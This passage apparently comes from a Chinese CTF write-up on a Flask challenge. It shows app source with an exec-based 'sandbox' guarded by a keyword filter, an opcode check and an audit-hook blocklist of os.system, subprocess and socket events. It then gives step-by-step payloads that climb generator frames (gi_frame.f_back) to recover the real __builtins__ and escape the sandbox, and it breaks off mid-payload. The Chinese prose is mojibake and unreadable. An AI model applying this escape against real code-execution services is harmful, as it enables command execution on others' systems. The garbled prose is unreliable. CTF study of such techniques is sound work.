class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">f&#x27;åšå®¢ã€Š<span class="subst">&#123;title&#125;</span>ã€‹å‘å¸ƒæˆåŠŸï¼&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    file_path = os.path.abspath(filename)</span><br><span class="line">    project_root = os.path.abspath(os.getcwd())</span><br><span class="line">    blog_dir = os.path.abspath(<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line">    allowed_dirs = [project_root, blog_dir]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(file_path.startswith(allowed + os.sep) <span class="keyword">or</span> file_path == allowed <span class="keyword">for</span> allowed <span class="keyword">in</span> allowed_dirs):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    basename = os.path.basename(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (basename == <span class="string">&#x27;app.py&#x27;</span> <span class="keyword">or</span> basename.endswith(<span class="string">&#x27;.html&#x27;</span>)):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/oj&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oj</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        code = data.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;ä»£ç ä¸èƒ½ä¸ºç©º&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            source_simple_check(code)</span><br><span class="line">            compiled_code = <span class="built_in">compile</span>(code, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">            source_opcode_checker(compiled_code)</span><br><span class="line">            safe_builtins = &#123;</span><br><span class="line">                <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">                <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">                <span class="string">&quot;str&quot;</span>: <span class="built_in">str</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>: <span class="built_in">int</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>: <span class="built_in">float</span>,</span><br><span class="line">                <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">                <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">                <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">                <span class="string">&quot;range&quot;</span>:<span class="built_in">range</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            sys.addaudithook(temp_audit_hook)</span><br><span class="line">            stdout = StringIO()</span><br><span class="line">            <span class="keyword">with</span> redirect_stdout(stdout):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;CTF_SANDBOX&quot;</span> + <span class="built_in">str</span>(<span class="built_in">id</span>(code)))</span><br><span class="line">                    <span class="built_in">exec</span>(compiled_code, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;, &#123;&#125;)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(sys, <span class="string">&#x27;audithooks&#x27;</span>):</span><br><span class="line">                        sys.audithooks.clear()</span><br><span class="line"></span><br><span class="line">            output = stdout.getvalue()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;output&quot;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> SandboxSecurityException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;å®‰å…¨æ‹¦æˆª: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;æ‰§è¡Œé”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_page</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;reset.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step1&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step1</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    email = data.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;email&#x27;</span>] == email:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;é‚®ç®±éªŒè¯æˆåŠŸ&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ç”¨æˆ·åæˆ–é‚®ç®±ä¸åŒ¹é…&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step2&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step2</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    id_card = data.get(<span class="string">&#x27;id_card&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    phone = data.get(<span class="string">&#x27;phone&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æ— æ•ˆç”¨æˆ·&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">            is_valid_id_card(id_card) <span class="keyword">and</span></span><br><span class="line">            is_valid_phone(phone) <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;id_card&#x27;</span>] == id_card <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;phone&#x27;</span>] == phone</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;èº«ä»½ä¿¡æ¯éªŒè¯æˆåŠŸ&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;èº«ä»½è¯å·æˆ–æ‰‹æœºå·é”™è¯¯&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step3&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step3</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    new_password = data.get(<span class="string">&#x27;new_password&#x27;</span>)</span><br><span class="line">    confirm_password = data.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> new_password != confirm_password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>&#125;)</span><br><span class="line">    users[username][<span class="string">&#x27;password_md5&#x27;</span>] = hashlib.md5(new_password.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;å¯†ç é‡ç½®æˆåŠŸï¼&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ˜¯ä¸€ä¸ªæ²™ç®±ï¼Œå¯ä»¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ï¼Œå­˜åœ¨ä¸‰é‡æ£€éªŒï¼Œä¸€ä¸ªæ˜¯æºç å±‚é¢çš„æ£€éªŒ <code>source_simple_check</code> ï¼Œéœ€è¦ä»£ç é‡Œä¸å­˜åœ¨è¿™äº›é»‘åå•å…³é”®è¯ï¼Œç¬¬äºŒå±‚æ˜¯å­—èŠ‚ç æ£€éªŒï¼Œç¬¬ä¸‰å±‚æ˜¯è¿è¡Œæ—¶æ£€éªŒï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ <code>addaudithook</code> ï¼Œä¸»è¦éœ€è¦ç»•è¿‡çš„æ˜¯ç¬¬ä¸€å±‚å’Œç¬¬ä¸‰å±‚ï¼Œå¯ä»¥å…ˆä»æ²™ç®±å…¥æ‰‹ï¼Œæƒ³åŠæ³•ç»•è¿‡æ²™ç®±ï¼Œä¸è¿‡ï¼Œæ²™ç®±ä¸­çš„ <code>&quot;__builtins__&quot;: safe_builtins</code> ï¼Œå¯çŸ¥å†…å»ºå‡½æ•°ä¸­æ²¡æœ‰å¯ä»¥è®©æˆ‘ä»¬å¯¼å…¥çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åŠæ³•é€ƒé€¸å‡ºæ²™ç®±ï¼Œåˆ°æ›´å¤–å±‚å¯èƒ½ä¼šæœ‰å¯ä»¥ä½¿ç”¨çš„ç‚¹ï¼Œæ‰€ä»¥ç”¨æ ˆå¸§é€ƒé€¸é€ƒåˆ°å¤–ç•Œå³å¯ã€‚</p><p>â€‹é¦–å…ˆæ˜¯æƒ³åŠæ³•é€ƒé€¸åˆ°å¤–ç•Œï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œå¤–ç•Œçš„ç¨‹åºé‡Œè‚¯å®šæ˜¯æœ‰ <code>&quot;__builtins__&quot;</code>  çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7cb887bbd0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;/app/app.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;Flask&#x27;: &lt;class &#x27;flask.app.Flask&#x27;&gt;, &#x27;request&#x27;: &lt;Request &#x27;http://47.92.129.245:5000/admin/oj&#x27; [POST]&gt;, &#x27;jsonify&#x27;: &lt;function jsonify at 0x7f7cb7976a20&gt;, &#x27;render_template&#x27;: &lt;function render_template at 0x7f7cb769c680&gt;, &#x27;session&#x27;: &lt;Secuã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹å¯è§ï¼Œè¿™é‡Œå­˜åœ¨ <code>&quot;__builtins__&quot;</code> ï¼Œå¯æƒœæ˜¯ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆï¼Œçœ‹çœ‹è¿™ä¸€å±‚æ˜¯å“ªä¸€å±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b) </span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;frame at 0x7f7cb76e3de0, file &#x27;/app/app.py&#x27;, line 263, code oj&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å…ˆæ¥åšä¸ª test æ–‡ä»¶æµ‹è¯•ä¸‹ï¼Œå°†è¿™ä¸¤ä¸ªæ²™ç®±å‡½æ•°ç¨å¾®æ”¹æ”¹ï¼Œæœ¬åœ°è°ƒè¯•ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç®€å•æ•´æ”¹ä¸‹æºç ä»»æœŸèƒ½å¤Ÿåœ¨æœ¬åœ°è¿è¡Œï¼Œä¹‹åå°±æ˜¯è°ƒè¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fcb0591f090&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;,ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œçš„ <code>&quot;__builtins__&quot;</code>  æ˜¯æ¨¡å—ï¼Œä½†æ˜¯å› ä¸ºç¬¬ä¸€å±‚ waf è¿‡æ»¤å¤ªå¤šå…³é”®å­—äº†ï¼Œæ‰€ä»¥æ ¹æ®æ¨¡å—çš„è°ƒç”¨æ–¹å¼è¿™ä¸ªä¼¼ä¹æ²¡æ³•è¿›è¡Œç»•è¿‡ï¼Œé‚£ä¹ˆå†å›æº¯ä¸€å±‚å†çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&#x27;__builtins__&#x27;: &#123;&#x27;__name__&#x27;: &#x27;builtins&#x27;, &#x27;__doc__&#x27;: &quot;Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all &#x27;built-in&#x27;\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThi ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±æˆäº†å­—å…¸ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œç»•è¿‡äº†ï¼Œè¿™é‡ŒæˆåŠŸè·å–äº† <code>&quot;__builtins__&quot;</code>  çš„å­—å…¸ï¼Œé‚£ä¹ˆåœ¨é¢˜ç›®é‡Œæµ‹è¯•ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok</span></span><br></pre></td></tr></table></figure><p>â€‹è¯æ˜æ˜¯æˆåŠŸäº†ï¼Œä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå¦‚æœç›´æ¥è¾“å‡º b ä¼šå¯¼è‡´ç¨‹åº crash æ‰ï¼Œå°½å¯èƒ½åˆ«è¾“å‡ºï¼Œè¿™ä¼¼ä¹æ˜¯åˆ«çš„ä»€ä¹ˆé—®é¢˜å¯¼è‡´çš„æŠ¥é”™ã€‚</p><p>â€‹æ—¢ç„¶æœ‰äº† <code>&quot;__builtins__&quot;</code>  ä¹‹åï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘ç›´æ¥æŠŠ <code>os._exit(0)</code>  ç»™æ¨æ‰ï¼Œè¿™æ ·å°±ç®—æ‰§è¡Œäº† <code>system</code>  ä¹‹ç±»çš„å‡½æ•°ä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œç›´æ¥æ‰”ä¸‹ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span 